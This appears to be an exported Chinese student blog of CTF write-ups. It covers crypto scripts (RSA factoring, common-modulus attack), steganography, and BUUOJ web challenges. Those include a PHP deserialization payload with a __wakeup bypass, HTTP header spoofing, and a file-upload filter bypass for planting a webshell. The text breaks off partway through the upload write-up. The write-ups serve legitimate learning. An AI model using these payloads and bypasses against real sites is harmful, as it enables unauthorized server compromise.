<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2020ctf新生赛wp</title>
    <url>/2020/12/12/2020sdu%E6%96%B0%E7%94%9F%E8%B5%9Bwp/</url>
    <content><![CDATA[<blockquote>
<ul>
<li><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><blockquote>
<ul>
<li><h4 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h4></li>
</ul>
<p>一串字符，没有什么奇怪的符号，base家族挨个试一下，发现base16能解码出flag（只有前几个大写字母，大概率是base16）。</p>
<a id="more"></a>

<ul>
<li><h4 id="不说人话？"><a href="#不说人话？" class="headerlink" title="不说人话？"></a>不说人话？</h4></li>
</ul>
<p>下载，解压，得到一个不知道是啥的文件，根据Misc解题法则，管他是什么先拖进16进制编辑器里look look，然后就发现一个五角星</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/%E4%B8%8D%E8%AF%B4%E4%BA%BA%E8%AF%9D1.png?raw=true"></p>
<p>（然而好像并没有）什么卵用……</p>
<p>再观察一下发现出现的字符只有’&gt;’, ‘&lt;’, ‘+’, ‘-‘, ‘.’几种，那这大概就是Brainfuck或Ook！了（**brainfuck**又被称为**brainf**k**或者**BF**，**brainfuck**语言用**&gt; &lt; + - . , [ ]**八种符号来替换C语言的各种语法和命令）。</p>
<p>百度一个<a href="https://www.splitbrain.org/services/ook">在线解密网站 </a> 复制粘贴解出flag。</p>
<ul>
<li><h4 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h4></li>
</ul>
<p><del>BUUCTF原题</del></p>
<p>LSB 隐写术，即最低有效位（Least Significant Bit）隐写术。是一种比较简单的基于二进制的隐写方式，能将一个完整的文件隐藏进另一张图片中。图像一般都是以RGB三原色的方式存储的，存储后R（红）、G（绿）、B（蓝）三组数据按顺序规律排列，每个的取值范围为0~255，范围对应的二进制值就是00000000-11111111，LSB就是把一个文件的二进制每一位拆分修改到图片的色彩数据的二进制值最低位。</p>
<p>​                                                                                                                        ——来自百度</p>
<p>也就是说每种颜色是由8个bit存储的二进制位，我悄悄地改掉最后一位几乎是看不出来了，所以信息就被有效隐写了。</p>
<p>处理LSB隐写的最常用的工具就是Stegsolve，用它打开压缩包里的图片，操作方式：Analyse→Data Extract→选择red,blue,green中 的0（此时发现Extract Preview中的16进制文件是个png）→Save bin（后缀名为.png）。得到一个二维码，在线扫一下得到flag。</p>
</blockquote>
</li>
<li><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><blockquote>
<ul>
<li><h4 id="Caesar"><a href="#Caesar" class="headerlink" title="Caesar"></a>Caesar</h4><p>凯撒密码显而易见了，Notifications中提供了<a href="http://ctf.ssleye.com/">CTF在线工具</a></p>
<p>多试几次，发现key=13时，明文为attack_at_nine_o ‘clock_tonight。</p>
</li>
<li><h4 id="RSA1"><a href="#RSA1" class="headerlink" title="RSA1"></a>RSA1</h4><h5 id="rsa加密过程"><a href="#rsa加密过程" class="headerlink" title="rsa加密过程"></a>rsa加密过程</h5><ol>
<li>选取两个整数 p,q</li>
<li>求出 n = p * q</li>
<li>求 n 的欧拉函数 phi(n) = (p-1) * (q-1)</li>
<li>随机去一个整数 e 作为公钥，要求 e 和 phi(n) 互素</li>
<li>求出私钥 d : ed ≡ 1 (mod phi(n)) （d是e的逆元）</li>
</ol>
<h5 id="加密算法："><a href="#加密算法：" class="headerlink" title="加密算法："></a>加密算法：</h5><p>c = pow(m,e,n)</p>
<h5 id="解密算法："><a href="#解密算法：" class="headerlink" title="解密算法："></a>解密算法：</h5><p>m =pow(c,d,n)</p>
<h6 id="关于题目："><a href="#关于题目：" class="headerlink" title="关于题目："></a>关于题目：</h6><p>题目中已经给了c,n,e了，思路也就很明显了：先把n分解成p,q（Notifications中提供了<a href="http://www.factordb.com/">大整数分解网站</a>），知道了p,q就可以求出phi(n),再用扩展欧几里得算法求出e再mod n下的逆元d，最后求出m。</p>
</li>
</ul>
<p>  脚本如下：</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">67692316911846383515666937548215377516026242122014572162117994514425606283681</span></span><br><span class="line">n = <span class="number">103461035900816914121390101299049044413950405173712170434161686539878160984549</span></span><br><span class="line">p = <span class="number">282164587459512124844245113950593348271</span></span><br><span class="line">q = <span class="number">366669102002966856876605669837014229419</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d = libnum.invmod(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line">print(libnum.n2s(m))</span><br></pre></td></tr></table></figure>

<p>  （最后要用libnum中的n2s将得到的m转化为字符串）。</p>
<ul>
<li><h4 id="RSA2"><a href="#RSA2" class="headerlink" title="RSA2"></a>RSA2</h4><p>又是rsa算法，但是打开txt发现有两个e和c，推测应该是用共模数攻击了。</p>
<h5 id="rsa的共模数攻击："><a href="#rsa的共模数攻击：" class="headerlink" title="rsa的共模数攻击："></a>rsa的共模数攻击：</h5><p>因为我们手上有一对明文和对应的公钥，那么如果有整数x, y使得：</p>
<p>e1 * x + e2 * y = 1</p>
<p>那么就可以有：</p>
<p>m (mod n) = m ^ 1 (mod n) = m ^ (e1 * x + e2 *y ) (mod n) = m ^ (e1 * x) + m ^ (e2 * y)</p>
<p>又因为：</p>
<p> c1 = m ^ e1 (mod n)     c2 = m ^ e2 (mod n)</p>
<p>所以就有：</p>
<p>m (mod n) = c1 ^ x + c2 ^ y (mod n)</p>
<p>其中x，y可由扩展欧几里得算法求出</p>
</li>
</ul>
<p>  脚本如下：</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n = <span class="number">20429315528655111523073560675648813309162375303954090348572329091957960032412518712093691044501240262294304779722690063594446637140928522882936561204180425968593685714138402078212148627806816974924904301217144262198933589412344408694401386330925556100970326676200349102533012051159456051076045413561059070291766268594455676378031127514060030926838750670330939410961355756909171469945402924037610757364146531235448523106870829710488056210511070536574177473906753241807683881800419949735443822439277498329376433536971257102334607742626401589209417830185425783917209141580607207923687068496513264733739213966151881471319</span></span><br><span class="line">e1 = <span class="number">4106294671</span></span><br><span class="line">e2 = <span class="number">4103337937</span></span><br><span class="line">c1 = <span class="number">12051796366524088489284445109295502686341498426965277230069915294159131976231473789977279364263965099422235647723775278060569378071469131866368399394772898224166518089593340803913798327451963589996734323497943301819051718709807518655868569656941242449109980876397661605271517459716669684900920279597477446629607627693769738733623143693170696779851882404994923673483971528314806130892416509854017091137325195201225617407959645788145876202882024723106204183257094755002924708009138560347432552090905489132135154932987521239299578509008290614398700799670928805692609756924823628055245227290288940649158862576448537833423</span></span><br><span class="line">c2 = <span class="number">16648382384980770705624348910895797622774711113202207693584907182552301186239613809347201161450012615995859738410661452438496756353485538305614949211776668793864984429696790944750894691957799234264508530084026894611228513698963347402329109838109621609770406925700520983387811451074838470370044678634099202003480925903267508744006195455234025325060817223813858985074720872124168142943926467694676717713503559007112874381750005406371400109962943508349497151148446064846096531445037416174913915923050332242843403926133165817310272633884358263778516770288515592959832151762499526363131801945163501999337808208074381212795</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">n2s</span>(<span class="params">num</span>):</span></span><br><span class="line">    t = <span class="built_in">hex</span>(num)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(t) % <span class="number">2</span> == <span class="number">1</span> :</span><br><span class="line">        t = t + <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(b, <span class="number">16</span>)) <span class="keyword">for</span> b <span class="keyword">in</span> [ t[ i : i+<span class="number">2</span> ] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(t), <span class="number">2</span>)]])</span><br><span class="line"><span class="comment">#这句是网上抄的，但这句话写的是真的好</span></span><br><span class="line"></span><br><span class="line">s = gmpy2.gcdext(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = -s[<span class="number">2</span>]</span><br><span class="line">c2 = gmpy2.invert(c2, n)</span><br><span class="line"></span><br><span class="line">m = (<span class="built_in">pow</span>(c1, s1, n) * <span class="built_in">pow</span>(c2, s2, n)) % n</span><br><span class="line">print(n2s(m))</span><br><span class="line"><span class="comment">#print(libnum.n2s(m)) libnum.n2s好像因为m太大了转不了，但我用m得到的字符串用libnum.s2n却能转回来（玄学）</span></span><br></pre></td></tr></table></figure>

<h5 id="关于大整数转字符串的原理"><a href="#关于大整数转字符串的原理" class="headerlink" title="关于大整数转字符串的原理"></a>关于大整数转字符串的原理</h5><p>  计算机存储中，一个字节8个bit，代表数值是0~255，这个数值就是ascii码中对应的字符。</p>
<p>  一个16进制表示的数刚好占4个bit，所以两个16进制位就可以有一个对应的字符。</p>
<p>  剩下的你懂的（doge）</p>
</blockquote>
</li>
</ul>
<ul>
<li><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><blockquote>
<ul>
<li><h4 id="阴间2048"><a href="#阴间2048" class="headerlink" title="阴间2048"></a>阴间2048</h4></li>
</ul>
<p>拿到题目先玩会（说不定就有flag了呢），然而玩了几千分也没见什么异常，旁边三个连接点了点也没得到什么有用的东西（出题人总不能把flag藏在人家的GitHub项目里面吧）。</p>
<p>按照web套路，F12看源码，network刷新一下看看包</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/%E9%98%B4%E9%97%B42048.png?raw=true"></p>
<p>哦？发现了一个别致的小东西</p>
<p>然后打开game.js看看有没有奇怪的地方</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/%E9%98%B4%E9%97%B420482.png?raw=true"></p>
<p>写个游戏能搞个这玩意？？？</p>
<p>按照它说的向网页get一下，成功得到flag</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/%E9%98%B4%E9%97%B420483.png?raw=true"></p>
</blockquote>
</li>
</ul>
</blockquote>
<p>4个小时就搞了这点（我太菜了），web第二题最后一步死活搞不对了，web第三题打开发现是个代码审计，再看看时间，下次一定。</p>
]]></content>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2020/12/11/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<a id="more"></a>

<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>欢迎来到我的博客园</title>
    <url>/2020/12/12/%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B0%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2%E5%9B%AD/</url>
    <content><![CDATA[<h2 id="我是谁？"><a href="#我是谁？" class="headerlink" title="我是谁？"></a>我是谁？</h2><p>普通高校的菜鸡学生，CTF未入门选手。</p>
<h2 id="搞什么？"><a href="#搞什么？" class="headerlink" title="搞什么？"></a>搞什么？</h2><p><del>被迫</del>搭博客写wp，虽然很无奈但是也挺好的吧。</p>
]]></content>
  </entry>
  <entry>
    <title>web-1 buuoj[极客大挑战 2019]PHP1</title>
    <url>/2020/12/12/Web-1%20buuoj%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DPHP/</url>
    <content><![CDATA[<h2 id="buuoj-极客大挑战-2019-PHP1"><a href="#buuoj-极客大挑战-2019-PHP1" class="headerlink" title="buuoj[极客大挑战 2019]PHP1"></a>buuoj[极客大挑战 2019]PHP1</h2><blockquote>
<ul>
<li><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4></li>
<li><h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4></li>
<li><h4 id="get的新姿势"><a href="#get的新姿势" class="headerlink" title="get的新姿势"></a>get的新姿势</h4></li>
</ul>
</blockquote>
<a id="more"></a>

<ul>
<li><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3></li>
</ul>
<ol>
<li><p>拿到网页，没有输入框，注入暴力算是无了？</p>
</li>
<li><p>f12瞅一下，没什么有用的东西。</p>
</li>
<li><p>提示说有备份，那就拿扫描器扫一下，发现有个<a href="http://www.zip/">www.zip</a></p>
</li>
<li><p>解压得到一个假的flag.php，但得到的index.php和class.php是有用的，根据其中的提示判定应该是个PHP反序列化漏洞，那么这要构造相应的字符串就搞定了。</p>
</li>
</ol>
<ul>
<li><h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><h4 id="1-dirsearch的安装和使用"><a href="#1-dirsearch的安装和使用" class="headerlink" title="1. dirsearch的安装和使用"></a>1. dirsearch的安装和使用</h4><p> <del>原来这玩意在windows下装完就能用了。</del></p>
<p> cmd切到dirsearch所在的目录，然后运行命令</p>
<p><code>py dirsearch.py -u (题目连接) -s 3</code></p>
<p>加上“-s 3“是因为默认设置扫的太频繁，然后就会：</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-1(1).png?raw=true" alt="报错"></p>
<p>虽然加个延迟会慢一些但至少能扫出来<a href="http://www.zip/">www.zip</a>.</p>
</li>
</ul>
<h4 id="2-关于网页的备份文件"><a href="#2-关于网页的备份文件" class="headerlink" title="2.关于网页的备份文件"></a>2.关于网页的备份文件</h4><p>  网站备份压缩文件泄露，是因为备份了网站源码讲其保存成zip等压缩格式。</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;.rar&#39;,&#39;.zip&#39;,&#39;.tar&#39;,&#39;.tar.bz2&#39;,&#39;.sql&#39;,&#39;.7z&#39;,&#39;.bak&#39;,&#39;.txt&#39;</span><br></pre></td></tr></table></figure>

<p>  如果我们这里要进行检测和利用的话，首先要有一个字典，这个字典的精度越高，那么判断效果越好。</p>
<p>  最常见的就是<a href="http://www.zip/">www.zip</a></p>
<p>  （所以做题没有头绪时扫一下可能会有惊喜）</p>
<h4 id="3-关于PHP反序列化漏洞"><a href="#3-关于PHP反序列化漏洞" class="headerlink" title="3.关于PHP反序列化漏洞"></a>3.关于PHP反序列化漏洞</h4><p>  <strong>PHP序列化与反序列化</strong></p>
<p>  PHP通过string serialize ( mixed $value )和mixed unserialize ( string $str )两个函数实现序列化和反序列化。</p>
<p>  下面是比较典型的PHP反序列化漏洞中可能会用到的魔术方法：</p>
<p>  void __wakeup ( void )</p>
<p>  unserialize( )会检查是否存在一个_wakeup( ) 方法。如果存在，则会先调用_wakeup 方法，预先准备对象需要的资源。</p>
<p>  void __construct ([ mixed $args [, $… ]])</p>
<p>  具有构造函数的类会在每次创建新对象时先调用此方法。</p>
<p>  void __destruct ( void )</p>
<p>  析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</p>
<p>  public string __toString ( void )</p>
<p>  __toString( ) 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj;应该显示些什么。</p>
<p>  此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</p>
<p>   （摘自i春秋）</p>
<p>  说人话就是PHP通过序列化和反序列化的方法将对象转化为字符串方便传输，有又因为在反序列化的过程中PHP对象会执行magic函数，因此我们可以通过构造特定的字符串控制函数，一步一步拿到flag。</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username &#x3D; &#39;nonono&#39;;</span><br><span class="line">    private $password &#x3D; &#39;yesyes&#39;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username &#x3D; $username;</span><br><span class="line">        $this-&gt;password &#x3D; $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username &#x3D; &#39;guest&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password !&#x3D; 100) &#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<p>看来只需要构造一个Name对象，使其password=100,username=admin，就能触发显示flag的条件了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">&amp;a = <span class="keyword">new</span> Name(<span class="number">100</span>,admin);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出构造好的字符串</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Namepassword&quot;;s:5:&quot;admin&quot;;s:14:&quot;Nameusername&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>

<p>然鹅这还不够</p>
<h5 id="问题1-private的处理"><a href="#问题1-private的处理" class="headerlink" title="问题1.private的处理"></a>问题1.private的处理</h5><p>对public，protected，private三种声明方式没有区分，实际上每种都有不同格式要求</p>
<p>public:         O:4:”Name”:2:{s:8:”username”;s:5:”admin”;s:8:”password”;i:100;}</p>
<p>protected:  O:4:”Name”:2:{s:11:” * username”;s:5:”admin”;s:11:” * password”;i:100;}</p>
<p>private:       O:4:”Name”:2:{s:14:” Name username”;s:5:”admin”;s:14:” Name password”;i:100;}</p>
<h5 id="问题2-wakeup函数的绕过"><a href="#问题2-wakeup函数的绕过" class="headerlink" title="问题2.__wakeup函数的绕过"></a>问题2.__wakeup函数的绕过</h5><p>PHP中的小规则，如果传入字符串中的对象应有的变量个数比实际的多（在字符串的表示中），那程序会自动跳过wakeup的执行。</p>
<p>因此需要把串改为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:3:&#123;s:14:&quot; Name username&quot;;s:5:&quot;admin&quot;;s:14:&quot; Name password&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>

<p>最后以get方式提交一下，获得flag。</p>
<ul>
<li><h3 id="get的新姿势-1"><a href="#get的新姿势-1" class="headerlink" title="get的新姿势"></a>get的新姿势</h3><ol>
<li><p>dirsearch的安装和使用</p>
</li>
<li><p>PHP反序列化漏洞的利用</p>
</li>
<li><p>一丢丢的PHP编程（我连PHP都不会 ）</p>
</li>
</ol>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>web-2 buuoj[极客大挑战 2019]Http1</title>
    <url>/2020/12/12/web-2/</url>
    <content><![CDATA[<h2 id="buuoj-极客大挑战-2019-Http1"><a href="#buuoj-极客大挑战-2019-Http1" class="headerlink" title="buuoj[极客大挑战 2019]Http1"></a>buuoj[极客大挑战 2019]Http1</h2><blockquote>
<ul>
<li><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4></li>
<li><h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4></li>
<li><h4 id="get的新姿势"><a href="#get的新姿势" class="headerlink" title="get的新姿势"></a>get的新姿势</h4></li>
</ul>
</blockquote>
<a id="more"></a>

<ul>
<li><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3></li>
</ul>
<ol>
<li><p>是个很正经的网页，f12搜一下源码，没什么明显的提示信息。</p>
</li>
<li><p>dirsearch扫一扫也没什么有用的东西。</p>
</li>
<li><p>题目提示HTTP，burpsuite截个包，发现相应里提示Secret.php。</p>
</li>
<li><p>根据网页提示修改HTTP请求头访问，最后得到flag。</p>
</li>
<li><h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><p>1.没什么思路就截个包，然后好东西就来了。</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-2.1.png?raw=true"></p>
<p>2.然后就查一下Secret.php目录，顺便抓个包。</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-2.8.png?raw=true"></p>
</li>
</ol>
<p>   3.要修改它的来源（这个描述可能不确切），可以通过伪造referer头来实现。</p>
<p>   <img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-2.2.png?raw=true"></p>
<p>   然后send过去看一下respond</p>
<p>   <img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-2.3.png?raw=true"></p>
<p>   4.发起请求的浏览器的修改可以通过修改User-Agent来实现</p>
<p>   <img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-2.4.png?raw=true"></p>
<p>   然后还没完</p>
<p>   <img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-2.5.png?raw=true"></p>
<p>   5.要弄成本地访问，可以通过伪造XFF头来实现</p>
<p>   <img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-2.6.png?raw=true"></p>
<p>   终于结束了。。。。。。</p>
<p>   <img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-2.7.png?raw=true"></p>
<h4 id="完结撒花"><a href="#完结撒花" class="headerlink" title="完结撒花!!!"></a>完结撒花!!!</h4><ul>
<li><h3 id="get的新姿势-1"><a href="#get的新姿势-1" class="headerlink" title="get的新姿势"></a>get的新姿势</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:authority: www.google.com.hk    # 请求的域名（对方的服务器地址）</span><br><span class="line">:method: GET                     # 请求方法，一般浏览器访问网站使用GET请求                     </span><br><span class="line">:path: &#x2F;?gws_rd&#x3D;ssl              # 请求路径，也就是 https:&#x2F;&#x2F;ww.google.com.hk&#x2F; 后面的内容</span><br><span class="line">:scheme: https                   # 请求的协议，这里使用https协议（使用SSL加密的http协议）</span><br><span class="line">accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng响应头,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line"># 请求文件类型，可以吧这里的文件类型Google一下，因为篇幅太长这里就不做详细介绍了（如text&#x2F;html是文档&#x2F;HTML文档的意思）</span><br><span class="line">accept-encoding: gzip, deflate, br  # 压缩类型，支援gzip,deflate,br 压缩方式</span><br><span class="line">accept-language: zh-HK,zh;q&#x3D;0.9  # 浏览器语言，我的默认语言是 zh-hk （中国-香港）</span><br><span class="line">cache-control: no-cache          # 缓存讯息，这里是 不缓存（no-cache）</span><br><span class="line">pragma: no-cache                 # 缓存来源</span><br><span class="line">sec-fetch-dest: document         # sec-fetch-* 意为如何使用返回的参数</span><br><span class="line">sec-fetch-mode: navigate</span><br><span class="line">sec-fetch-site: same-origin</span><br><span class="line">sec-fetch-user: ?1</span><br><span class="line">upgrade-insecure-requests: 1     # 不用在意这个东西</span><br><span class="line">user-agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;86.0.4240.183 Safari&#x2F;537.36 Edg&#x2F;86.0.622.63</span><br><span class="line"># 非常重要的浏览器UA，表明了浏览器的身份：是什么内核，运行在什么系统上</span><br></pre></td></tr></table></figure>

<p>（来自知乎-啄木鸟的面包房）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">referer: www.baidu.com (记录从哪个网站过来的，可以用来统计流量和防盗链，如果是空就是没有限制)</span><br><span class="line">x-forwarded-for：127.0.0.0 (用来表示 HTTP 请求端真实 IP)</span><br></pre></td></tr></table></figure>

</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>web-3 buuoj [极客大挑战 2019]Upload</title>
    <url>/2020/12/14/web-3/</url>
    <content><![CDATA[<h1 id="buuoj-极客大挑战-2019-Upload"><a href="#buuoj-极客大挑战-2019-Upload" class="headerlink" title="buuoj [极客大挑战 2019]Upload"></a>buuoj [极客大挑战 2019]Upload</h1><blockquote>
<ul>
<li><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4></li>
<li><h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4></li>
<li><h4 id="get的新姿势"><a href="#get的新姿势" class="headerlink" title="get的新姿势"></a>get的新姿势</h4></li>
</ul>
</blockquote>
<a id="more"></a>

<ul>
<li><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>显然是个文件上传漏洞，那就先传个一句话木马试试。</li>
<li>必须要求是图片类型，后面加上.png。</li>
<li>还不行，看来是在服务端的过滤了，那就改一下Content-Type头（MIME协议）。</li>
<li>过滤了php？！此处采用了phtml这个骚姿势（当然一句话木马也要改一下）。</li>
<li>还不行，似乎能根据文件内容判断。再次骚姿势，在文件前面加上个图片的文件头伪造，成功传入木马。</li>
</ol>
</li>
<li><h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><ol>
<li><p>先随便传一个试试吧</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-3.1.png?raw=true"></p>
</li>
<li><p>再加个png后缀名，判断是前端过滤还是服务端过滤</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-3.2.png?raw=true"></p>
<p>多半是服务端对上传文件的检查了。。。麻烦</p>
</li>
<li><p>改一下Content-Type头，用于伪造传入的文件类型</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-3.3.png?raw=true"></p>
<p>就但看php不爽？？？直接给滤了。</p>
</li>
<li><p>传php看来是不可行了，只能试试phtml了。。。</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-3.4.png?raw=true"></p>
<p>绕过了但是还不行，可能是对传入的文件内容进行了检查（离谱）。</p>
</li>
<li><p>在文件中写入图片的文件头，执行的时候会被当做无意义字符过滤掉。</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-3.5.png?raw=true"></p>
</li>
</ol>
